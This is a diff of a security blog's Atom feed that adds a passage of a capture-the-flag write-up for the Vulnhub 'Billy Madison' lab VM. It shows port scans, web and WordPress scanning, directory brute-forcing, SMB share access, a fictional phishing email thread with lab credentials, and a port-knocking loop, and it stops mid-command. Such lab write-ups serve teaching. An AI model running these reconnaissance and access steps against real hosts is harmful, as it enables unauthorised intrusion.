@@ -1,6 +1,916 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="http://jekyllrb.com" version="3.4.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2017-03-12T10:34:58+00:00</updated><id>http://localhost:4000/</id><title type="html">Root Network Security</title><subtitle>RootNetSec is a site about journey through the world of network security, pentesting, Linux administration, programming an networking. View to learn more!</subtitle><entry><title type="html">Overthewire.org - Behemoth 0 -&amp;gt; 1</title><link href="http://localhost:4000/overthewire/2017/03/12/overthewire.org-behemoth-1/" rel="alternate" type="text/html" title="Overthewire.org - Behemoth 0 -&gt; 1" /><published>2017-03-12T00:00:00+00:00</published><updated>2017-03-12T00:00:00+00:00</updated><id>http://localhost:4000/overthewire/2017/03/12/overthewire.org-behemoth-1</id><content type="html" xml:base="http://localhost:4000/overthewire/2017/03/12/overthewire.org-behemoth-1/">&lt;h1&gt;Introduction&lt;/h1&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="http://jekyllrb.com" version="3.4.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2017-03-19T09:45:38+00:00</updated><id>http://localhost:4000/</id><title type="html">Root Network Security</title><subtitle>RootNetSec is a site about journey through the world of network security, pentesting, Linux administration, programming an networking. View to learn more!</subtitle><entry><title type="html">Vulnhub.com - Billy Madison 1.1</title><link href="http://localhost:4000/write-ups/2017/03/15/vulnhub-billy-madison/" rel="alternate" type="text/html" title="Vulnhub.com - Billy Madison 1.1" /><published>2017-03-15T02:00:00+00:00</published><updated>2017-03-15T02:00:00+00:00</updated><id>http://localhost:4000/write-ups/2017/03/15/vulnhub-billy-madison</id><content type="html" xml:base="http://localhost:4000/write-ups/2017/03/15/vulnhub-billy-madison/">&lt;h1&gt;Introduction&lt;/h1&gt;
 
-&lt;p&gt;Today we're going to be attacking another reverse engineering challenge, this time from the &lt;b&gt;Behemoth&lt;/b&gt; series. &lt;/p&gt;
+&lt;p&gt;Today we're going to try and root another machine from Vulnhub called &lt;a href=&quot;https://www.vulnhub.com/entry/billy-madison-11,161/&quot;&gt;&lt;b&gt;Billy Madison&lt;/b&gt;&lt;/a&gt;. Our objective is to figure out how Eric took over the machine, undo his changes and recover Billy's 12th grade final project. Sounds great! &lt;/p&gt;
+
+&lt;h1&gt;Write-Up&lt;/h1&gt;
+&lt;h2&gt;Service Discovery&lt;/h2&gt;
+
+&lt;p&gt;Our machine was assigned &lt;b&gt;10.0.2.4&lt;/b&gt; IP address. Let's fire off an comprehensive Nmap scan to look for attack surface.  &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;nmap -sS -sU -Pn -p- 10.0.2.4
+
+Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-03-12 11:04 EDT
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;10.0.2.4
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00084s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
+Not shown: 65535 open|filtered ports, 65526 filtered ports
+PORT     STATE  SERVICE
+22/tcp   open   ssh
+23/tcp   open   telnet
+69/tcp   open   tftp
+80/tcp   open   http
+137/tcp  closed netbios-ns
+138/tcp  closed netbios-dgm
+139/tcp  open   netbios-ssn
+445/tcp  open   microsoft-ds
+2525/tcp open   ms-v-worlds
+MAC Address: 08:00:27:2B:54:39 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;209.02 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h2&gt;Telnet&lt;/h2&gt;
+&lt;p&gt;Firstly I tried connecting via &lt;b&gt;ssh&lt;/b&gt;, unfortunately without luck. After a few attempts I decided to check out &lt;b&gt;telnet port 23&lt;/b&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;telnet 10.0.2.4
+Trying 10.0.2.4...
+Connected to 10.0.2.4.
+Escape character is &lt;span class=&quot;s1&quot;&gt;'^]'&lt;/span&gt;.
+
+
+&lt;span class=&quot;k&quot;&gt;*****&lt;/span&gt; HAHAH! You&lt;span class=&quot;s1&quot;&gt;'re banned for a while, Billy Boy!  By the way, I caught you trying to hack my wifi - but the joke'&lt;/span&gt;s on you! I don&lt;span class=&quot;s1&quot;&gt;'t use ROTten passwords like rkfpuzrahngvat anymore! Madison Hotels is as good as MINE!!!! *****
+
+Connection closed by foreign host.&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;False alarm? After a while of thinking I can see a small clue in the second part of the message - &lt;b&gt;ROT&lt;/b&gt; and &lt;b&gt;rkfpuzrahngvat&lt;/b&gt;. ROT13 encryption? Yes! After decrypting the string we got this word - &lt;b&gt;exschmenuating&lt;/b&gt;.&lt;/p&gt;
+
+&lt;p&gt;Unluckily, now I have no idea how to use it, so let's just note that for later. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;ncat -v 192.168.110.105 23
+Ncat: Version 7.25BETA1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org/ncat &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Ncat: Connection refused.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;In addition it seems that we are banned from telnet.&lt;/p&gt;
+
+&lt;h2&gt;Website - port 80&lt;/h2&gt;
+
+&lt;p&gt;We can move on to the potential website running at port &lt;b&gt;80&lt;/b&gt;. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/billy-madison/billy-website.png&quot; alt=&quot;Billy's Website&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Unfortunately I don't see anything useful here, apart from random quotes coming from &lt;i&gt;Billy Madison&lt;/i&gt;. film. Maybe &lt;b&gt;Nikto&lt;/b&gt; will tell us something more useful?&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;nikto -h 10.0.2.4
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.0.2.4
++ Target Hostname:    10.0.2.4
++ Target Port:        80
++ Start Time:         2017-03-12 16:04:42 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a different fashion to the MIME &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;
++ No CGI Directories found &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s1&quot;&gt;'-C all'&lt;/span&gt; to force check all possible &lt;span class=&quot;nb&quot;&gt;dirs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ Web Server returns a valid response with junk HTTP methods, this may cause &lt;span class=&quot;nb&quot;&gt;false &lt;/span&gt;positives.
++ Server leaks inodes via ETags, header found with file /manual/, fields: 0x272 0x537ae56951000
++ OSVDB-3092: /manual/: Web server manual found.
++ OSVDB-3268: /manual/images/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ 7535 requests: 0 error&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; and 8 item&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; reported on remote host
++ End Time:           2017-03-12 16:05:04 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;22 seconds&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+---------------------------------------------------------------------------
++ 1 host&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; tested&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;No clues, and nothing hidden in the page, or the headers. Luckily we have plenty of other ports open in this machine. &lt;/p&gt;
+
+&lt;h2&gt;Wordpress - port 69&lt;/h2&gt;
+
+&lt;p&gt;Next move is to check port &lt;b&gt;69&lt;/b&gt;, which is running &lt;b&gt;http&lt;/b&gt; service. Another website? &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/billy-madison/billy-wordpress.png&quot; alt=&quot;Billy's WordPress Blog&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Wow, an old school WordPress 1.0. Let's run another portion of scans. Firstly &lt;b&gt;Nikto&lt;/b&gt;.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;nikto -h 10.0.2.4 -port 69
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.0.2.4
++ Target Hostname:    10.0.2.4
++ Target Port:        69
++ Start Time:         2017-03-12 16:14:20 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+---------------------------------------------------------------------------
++ Server: MadisonHotelsWordpress
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a different fashion to the MIME &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;
++ No CGI Directories found &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s1&quot;&gt;'-C all'&lt;/span&gt; to force check all possible &lt;span class=&quot;nb&quot;&gt;dirs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
++ Allowed HTTP Methods: HEAD, GET, POST, OPTIONS
++ OSVDB-3092: /xmlrpc.php: xmlrpc.php was found.
++ /readme.html: This WordPress file reveals the installed version.
++ /wp-login.php: Wordpress login found
++ /wp-content/plugins/gravityforms/change_log.txt: Gravity forms is installed. Based on the version number &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the changelog, it is vulnerable to an authenticated SQL injection. https://wpvulndb.com/vulnerabilities/7849
++ 7551 requests: 13 error&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; and 8 item&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; reported on remote host
++ End Time:           2017-03-12 16:13:55 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;26 seconds&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+---------------------------------------------------------------------------
++ 1 host&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; tested&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Maybe &lt;b&gt;WPScan&lt;/b&gt;?&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;wpscan --url 10.0.2.4:69
+_______________________________________________________________
+        __          _______   _____                  
+        &lt;span class=&quot;se&quot;&gt;\ \ &lt;/span&gt;       / /  __ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;/ ____|                 
+         &lt;span class=&quot;se&quot;&gt;\ \ &lt;/span&gt; /&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt; / /| |__&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; | &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;___   ___  __ _ _ __  
+          &lt;span class=&quot;se&quot;&gt;\ \/&lt;/span&gt;  &lt;span class=&quot;se&quot;&gt;\/&lt;/span&gt; / |  ___/ &lt;span class=&quot;se&quot;&gt;\_&lt;/span&gt;__ &lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;/ __|/ _&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; | &lt;span class=&quot;s1&quot;&gt;'_ \
+           \  /\  /  | |     ____) | (__| (_| | | | |
+            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+        WordPress Security Scanner by the WPScan Team
+                       Version 2.9
+          Sponsored by Sucuri - https://sucuri.net
+   @_WPScan_, @ethicalhack3r, @erwan_lr, pvdl, @_FireFart_
+_______________________________________________________________
+
+The plugins directory '&lt;/span&gt;wp-content/plugins&lt;span class=&quot;s1&quot;&gt;' does not exist.
+You can specify one per command line option (don'&lt;/span&gt;t forget to include the wp-content directory &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;needed&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;?] Continue? &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Y]es &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;N]o, default: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;N]
+Y
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] URL: http://10.0.2.4:69/
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Started: Sun Mar 12 16:17:13 2017
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;!] The WordPress &lt;span class=&quot;s1&quot;&gt;'http://10.0.2.4:69/readme.html'&lt;/span&gt; file exists exposing a version number
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Interesting header: SERVER: MadisonHotelsWordpress
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] XML-RPC Interface available under: http://10.0.2.4:69/xmlrpc.php
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] WordPress version 1.0 identified from meta generator
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] WordPress theme &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;use: twentyeleven
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Name: twentyeleven
+ |  Latest version: 2.5
+ |  Location: http://10.0.2.4:69/wp-content/themes/twentyeleven/
+ |  Readme: http://10.0.2.4:69/wp-content/themes/twentyeleven/readme.txt
+ |  Changelog: http://10.0.2.4:69/wp-content/themes/twentyeleven/changelog.txt
+ |  Style URL: http://10.0.2.4:69/wp-content/themes/twentyeleven/style.css
+ |  Referenced style.css: http://10.0.2.4:69/static/wp-content/themes/twentyeleven/style.css
+ |  Description:
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Enumerating plugins from passive detection ...
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] No plugins found
+
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Finished: Sun Mar 12 16:17:13 2017
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Requests Done: 36
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Memory used: 6.344 MB
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Elapsed &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 00:00:00&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;No luck here, I don't even think that WPScan is working against such an old version of WordPress. &lt;/p&gt;
+
+&lt;h2&gt;Exschmenuating?&lt;/h2&gt;
+
+&lt;p&gt;After a while of thinking I've found that there is additional page in Billys website - &lt;b&gt;http://10.0.2.4/exschmenuating/&lt;/b&gt;. Maybe we'll get more clues on this one? &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/billy-madison/billy-exschmenuating.png&quot; alt=&quot;Billy's Exschmenuating Subpage&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Journal? Firstly let's take a look at &lt;b&gt;Log monitor&lt;/b&gt;, then we'll come back to its content. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;---
+2017-03-12-15-35-01
+Hosts currently banned
+Chain INPUT (policy DROP)
+DROP       all  --  10.0.2.15            anywhere
+---
+If your IP appears in this list it has been banned, and you will need to reset this host to lift the ban. Otherwise, further efforts to connect to this host may produce false positives or refuse connections altogether.
+---&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Now let's reset our machine and once again take a look at the log. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;---
+2017-03-12-15-38-01
+Hosts currently banned
+Chain INPUT &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;policy DROP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+---
+If your IP appears &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this list it has been banned, and you will need to reset this host to lift the ban. Otherwise, further efforts to connect to this host may produce &lt;span class=&quot;nb&quot;&gt;false &lt;/span&gt;positives or refuse connections altogether.
+---&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;After connecting a few facts I've noticed that the log was showing entries banned from &lt;b&gt;telnet&lt;/b&gt;.&lt;/p&gt;
+
+&lt;p&gt;But we have another clue, in the &lt;b&gt;08/03/16&lt;/b&gt; part of a page saying: &lt;/p&gt;
+&lt;p&gt;&lt;i&gt;I .captured the whole thing in this folder for later lulz. I put 'veronica' somewhere in the file name&lt;/i&gt; &lt;/p&gt;
+
+&lt;h2&gt;veronica.cap&lt;/h2&gt;
+
+&lt;p&gt;Is it some &lt;b&gt;.cap&lt;/b&gt; file? With &lt;b&gt;veronica&lt;/b&gt; in file name? Let's prepare for &lt;b&gt;dirbuster&lt;/b&gt; by firstly creating an wordlist. I'm going to use rockyou.txt file, but only with grepped &lt;b&gt;veronica&lt;/b&gt;. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:/usr/share/wordlists# &lt;/span&gt;cat rockyou.txt | grep &lt;span class=&quot;s2&quot;&gt;&quot;veronica&quot;&lt;/span&gt; &amp;gt; veronica.txt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;And now we're ready to run dirbuster. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/billy-madison/billy-dirbuster.png&quot; alt=&quot;Dirbuster&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Awesome, we have found a file! It's another &lt;b&gt;.cap&lt;/b&gt; file, this time it contains email conversation between Veronica and Eric. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;MAIL FROM:&amp;lt;eric@madisonhotels.com&amp;gt;
+RCPT TO:&amp;lt;vvaughn@polyfector.edu&amp;gt;
+DATA
+Date: Sat, 20 Aug 2016 21:56:50 -0500
+To: vvaughn@polyfector.edu
+From: eric@madisonhotels.com
+Subject: VIRUS ALERT!
+X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
+
+Hey Veronica,
+
+Eric Gordon here.  
+
+I know you use Billy's machine more than he does, so I wanted to let you know that the company is rolling out a new antivirus program for all work-from-home users.  Just &amp;lt;a href=&quot;http://areallyreallybad.malware.edu.org.ru/f3fs0azjf.php&quot;&amp;gt;click here&amp;lt;/a&amp;gt; to install it, k?  
+
+Thanks. -Eric
+
+
+.
+QUIT
+
+EHLO kali
+MAIL FROM:&amp;lt;vvaughn@polyfector.edu&amp;gt;
+RCPT TO:&amp;lt;eric@madisonhotels.com&amp;gt;
+DATA
+Date: Sat, 20 Aug 2016 21:57:00 -0500
+To: eric@madisonhotels.com
+From: vvaughn@polyfector.edu
+Subject: test Sat, 20 Aug 2016 21:57:00 -0500
+X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
+RE: VIRUS ALERT!
+
+Eric,
+
+Thanks for your message. I tried to download that file but my antivirus blocked it.
+
+Could you just upload it directly to us via FTP?  We keep FTP turned off unless someone connects with the &quot;Spanish Armada&quot; combo.
+
+https://www.youtube.com/watch?v=z5YU7JwVy7s
+
+-VV
+
+
+.
+QUIT
+
+EHLO kali
+MAIL FROM:&amp;lt;eric@madisonhotels.com&amp;gt;
+RCPT TO:&amp;lt;vvaughn@polyfector.edu&amp;gt;
+DATA
+Date: Sat, 20 Aug 2016 21:57:11 -0500
+To: vvaughn@polyfector.edu
+From: eric@madisonhotels.com
+Subject: test Sat, 20 Aug 2016 21:57:11 -0500
+X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
+RE[2]: VIRUS ALERT!
+
+Veronica,
+
+Thanks that will be perfect.  Please set me up an account with username of &quot;eric&quot; and password &quot;ericdoesntdrinkhisownpee&quot;.
+
+-Eric
+
+
+.
+QUIT
+
+EHLO kali
+MAIL FROM:&amp;lt;vvaughn@polyfector.edu&amp;gt;
+RCPT TO:&amp;lt;eric@madisonhotels.com&amp;gt;
+DATA
+Date: Sat, 20 Aug 2016 21:57:21 -0500
+To: eric@madisonhotels.com
+From: vvaughn@polyfector.edu
+Subject: test Sat, 20 Aug 2016 21:57:21 -0500
+X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
+RE[3]: VIRUS ALERT!
+
+Eric,
+
+Done.
+
+-V
+
+
+.
+QUIT
+
+EHLO kali
+MAIL FROM:&amp;lt;eric@madisonhotels.com&amp;gt;
+RCPT TO:&amp;lt;vvaughn@polyfector.edu&amp;gt;
+DATA
+Date: Sat, 20 Aug 2016 21:57:31 -0500
+To: vvaughn@polyfector.edu
+From: eric@madisonhotels.com
+Subject: test Sat, 20 Aug 2016 21:57:31 -0500
+X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
+RE[4]: VIRUS ALERT!
+
+Veronica,
+
+Great, the file is uploaded to the FTP server, please go to a terminal and run the file with your account - the install will be automatic and you won't get any pop-ups or anything like that.  Thanks!
+
+-Eric
+
+
+.
+QUIT
+
+EHLO kali
+MAIL FROM:&amp;lt;vvaughn@polyfector.edu&amp;gt;
+RCPT TO:&amp;lt;eric@madisonhotels.com&amp;gt;
+DATA
+Date: Sat, 20 Aug 2016 21:57:41 -0500
+To: eric@madisonhotels.com
+From: vvaughn@polyfector.edu
+Subject: test Sat, 20 Aug 2016 21:57:41 -0500
+X-Mailer: swaks v20130209.0 jetmore.org/john/code/swaks/
+RE[5]: VIRUS ALERT!
+
+Eric,
+
+I clicked the link and now this computer is acting really weird.  The antivirus program is popping up alerts, my mouse started to move on its own, my background changed color and other weird stuff.  I'm going to send this email to you and then shut the computer down.  I have some important files I'm worried about, and Billy's working on his big 12th grade final.  I don't want anything to happen to that!
+
+-V
+
+
+.
+QUIT&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;h2&gt;Port knocking, SMB and ftp&lt;/h2&gt;
+
+&lt;p&gt;Wow, that's some solid portion of clues. Let's list what we know. &lt;/p&gt;
+
+&lt;p&gt;We have credentials to ftp &lt;b&gt;eric&lt;/b&gt; with password &lt;b&gt;ericdoesntdrinkhisownpee&lt;/b&gt;. But what is this &lt;b&gt;Spanish Armada combo&lt;/b&gt;? Some secret code? I'll come back to it later.&lt;/p&gt;
+
+&lt;p&gt;For now we can move to other ports - especially &lt;b&gt;SMB&lt;/b&gt; running on ports &lt;b&gt;139&lt;/b&gt; and &lt;b&gt;445&lt;/b&gt;. We can firstly check if there are any shares available on the target.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;smbclient -L 10.0.2.4
+Enter root&lt;span class=&quot;s1&quot;&gt;'s password:
+Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	EricsSecretStuff Disk      
+	IPC$            IPC       IPC Service (BM)
+Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]
+
+	Server               Comment
+	---------            -------
+	BM                   BM
+
+	Workgroup            Master
+	---------            -------
+	WORKGROUP            BM&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Great, now we can see if we can connect, and also try to download all of the files stored in the share. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;smbclient //10.0.2.4/EricsSecretStuff
+Enter root&lt;span class=&quot;s1&quot;&gt;'s password:
+Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.3.11-Ubuntu]
+smb: \&amp;gt; ls -la
+NT_STATUS_NO_SUCH_FILE listing \-la
+smb: \&amp;gt; ls
+  .                                   D        0  Sun Mar 12 16:37:40 2017
+  ..                                  D        0  Sat Aug 20 14:56:45 2016
+  ._.DS_Store                        AH     4096  Wed Aug 17 10:32:07 2016
+  ebd.txt                             N       35  Sun Mar 12 16:37:40 2017
+  .DS_Store                          AH     6148  Wed Aug 17 10:32:12 2016
+
+		59164 blocks of size 524288. 49861 blocks available
+smb: \&amp;gt; get ebd.txt
+getting file \ebd.txt of size 35 as ebd.txt (4.9 KiloBytes/sec) (average 4.9 KiloBytes/sec)
+smb: \&amp;gt; get ._.DS_Store
+getting file \._.DS_Store of size 4096 as ._.DS_Store (1333.3 KiloBytes/sec) (average 403.4 KiloBytes/sec)
+smb: \&amp;gt; get .DS_Store
+getting file \.DS_Store of size 6148 as .DS_Store (750.5 KiloBytes/sec) (average 557.7 KiloBytes/sec)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Ok, now let's view what &lt;b&gt;edb.txt&lt;/b&gt; has inside. &lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/img/billy-madison/billy-edb.png&quot; alt=&quot;EDB Note&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Hmmm, some kind of backdoor? Unfortunately this information won't tell us anything so let's keep it in mind for later. &lt;/p&gt;
+
+&lt;p&gt;After quite a lot of time connecting all known facts, especially after watching &lt;a href=&quot;https://www.youtube.com/watch?v=z5YU7JwVy7s&quot;&gt;&lt;b&gt;this video&lt;/b&gt;&lt;/a&gt;, I've figured out that these dates look like a &lt;b&gt;port knocking sequence&lt;/b&gt;. We can try to knock using this simple bash script. &lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;x &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;1466 67 1469 1514 1981 1986 1588; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;nmap -Pn --host_timeout 201 --max-retries 0 -p &lt;span class=&quot;nv&quot;&gt;$x&lt;/span&gt; 10.0.2.4; &lt;span class=&quot;k&quot;&gt;done
+
